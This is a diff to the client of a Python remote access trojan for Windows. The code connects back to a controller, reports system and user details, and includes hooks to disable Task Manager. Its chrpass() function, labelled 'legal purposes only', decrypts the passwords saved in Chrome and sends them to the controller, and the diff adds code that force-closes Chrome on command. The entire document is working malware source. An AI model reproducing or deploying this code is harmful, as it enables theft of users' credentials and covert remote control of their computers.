@@ -1,9 +1,9 @@
-import socket, os, sys, platform, pyautogui, time, ctypes, subprocess, webbrowser, sqlite3
+import socket, os, sys, platform, pyautogui, time, ctypes, subprocess, webbrowser
 import win32console, win32gui, win32api, winerror, win32event, win32crypt
 import pygame.camera, pygame.image
+import sqlite3
 from shutil import copyfile
 from winreg import *
-from urllib.request import urlopen
 
 # sys.stderr = None  # prevent errors from being shown
 
@@ -41,7 +41,7 @@ while True:  # infinite loop until socket can connect
         objSocket = socket.socket()
         objSocket.connect((strHost, intPort))
     except socket.error:
-        time.sleep(10)  # wait 10 seconds to try again
+        time.sleep(5)  # wait 5 seconds to try again
     else: break
 
 # function to return decoded utf-8
@@ -52,10 +52,11 @@ def recvall(buffer):  # function to receive large amounts of data
     bytData = b""
     while True:
         bytPart = objSocket.recv(buffer)
+        if len(bytPart) == buffer:
+            return bytPart
         bytData += bytPart
         if len(bytData) == buffer:
-            break
-    return bytData
+            return bytData
 
 
 def msg(data):
@@ -81,15 +82,9 @@ def info():
     strOS = platform.system() + " " + platform.release()
     strPCName = socket.gethostname()
 
-    try:
-        strIP = urlopen("http://ident.me").read().decode('utf8')  # get external ip
-    except: strIP = "?"
-
-    strIP = strIP + " | " + socket.gethostbyname(strPCName)
     strUser = os.environ["USERNAME"]
 
-    strInfo = "OS: " + strOS + "\n" + "PC Name: " + strPCName + "\n" + "IP: " + \
-              strIP + "\n" + "Username: " + strUser + "\n"
+    strInfo = "OS: " + strOS + "\n" + "PC Name: " + strPCName + "\n" + "Username: " + strUser + "\n"
     objSocket.send(str.encode(strInfo))
 
 
@@ -268,6 +263,11 @@ def disable_taskmgr():
 
 def chrpass():  # legal purposes only!
     strPath = APPDATA + "/../Local/Google/Chrome/User Data/Default/Login Data"
+
+    if not os.path.isfile(APPDATA + "/../Local/Google/Chrome/User Data/Default/Login Data"):
+        objSocket.send(str.encode("noexist"))
+        return
+
     conn = sqlite3.connect(strPath)  # connect to database
     objCursor = conn.cursor()
 
@@ -275,6 +275,10 @@ def chrpass():  # legal purposes only!
         objCursor.execute("Select action_url, username_value, password_value FROM logins")  # look for credentials
     except:  # if the chrome is open
         objSocket.send(str.encode("error"))
+        strServerResponse = decode_utf8(objSocket.recv(1024))
+
+        if strServerResponse == "close":  # if the user wants to close the browser
+            subprocess.Popen(["taskkill", "/f", "/im", "chrome.exe"], shell=True)
         return
 
     strResults = "Chrome Saved Passwords:" + "\n"
@@ -283,7 +287,7 @@ def chrpass():  # legal purposes only!
         password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
         if password:
             strResults += "Site: " + result[0] + "\n" + "Username: " + result[1] + "\n" + "Password: " \
-                          + "\n" + str(password)
+                          + decode_utf8(password)
 
     strBuffer = str(len(strResults))
     objSocket.send(str.encode(strBuffer))  # send buffer
